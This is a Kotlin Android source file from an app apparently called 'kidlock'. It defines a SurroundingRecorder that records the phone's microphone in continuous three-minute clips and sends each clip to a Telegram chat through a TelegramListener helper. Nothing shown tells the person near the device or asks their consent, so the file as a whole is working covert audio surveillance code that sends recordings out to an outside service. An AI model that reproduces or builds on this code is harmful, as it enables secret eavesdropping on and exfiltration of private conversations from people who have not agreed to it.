package com.kidlock

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object SurroundingRecorder {

    private const val TAG = "SurroundingRecorder"
    private const val CLIP_MS = 3 * 60 * 1000L

    private var recorder: MediaRecorder? = null
    private var currentFile: File? = null
    private var running = false
    private var paused = false
    private var appContext: Context? = null
    private val handler = Handler(Looper.getMainLooper())

    fun start(context: Context) {
        if (running) return
        appContext = context.applicationContext
        running = true
        cycle()
    }

    fun pause() {
        if (paused) return
        paused = true
        handler.removeCallbacksAndMessages(null)
        stopClipSilently()
    }

    fun resume() {
        if (!running || !paused) return
        paused = false
        cycle()
    }

    private fun cycle() {
        if (!running || paused) return
        startClip()
        handler.postDelayed({
            if (!paused) {
                stopAndSend()
                cycle()
            }
        }, CLIP_MS)
    }

    private fun startClip() {
        val ctx = appContext ?: return
        try {
            val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            currentFile = File(ctx.cacheDir, "surround_$ts.mp4")

            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                MediaRecorder(ctx)
            else @Suppress("DEPRECATION") MediaRecorder()

            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(96000)
                setOutputFile(currentFile!!.absolutePath)
                prepare()
                start()
            }
        } catch (e: Exception) {
            Log.e(TAG, "startClip error: ${e.message}")
        }
    }

    private fun stopAndSend() {
        try {
            recorder?.apply { stop(); release() }
        } catch (e: Exception) {}
        recorder = null
        currentFile?.let { file ->
            if (file.exists() && file.length() > 2048) {
                val ts = SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.getDefault()).format(Date())
                TelegramListener.instance.sendAudio(file.absolutePath, "🎙️ Surrounding — $ts")
            } else file.delete()
        }
    }

    private fun stopClipSilently() {
        try { recorder?.apply { stop(); release() } } catch (e: Exception) {}
        recorder = null
        currentFile?.delete()
        currentFile = null
    }

    fun stop() {
        running = false
        handler.removeCallbacksAndMessages(null)
        stopAndSend()
    }
}
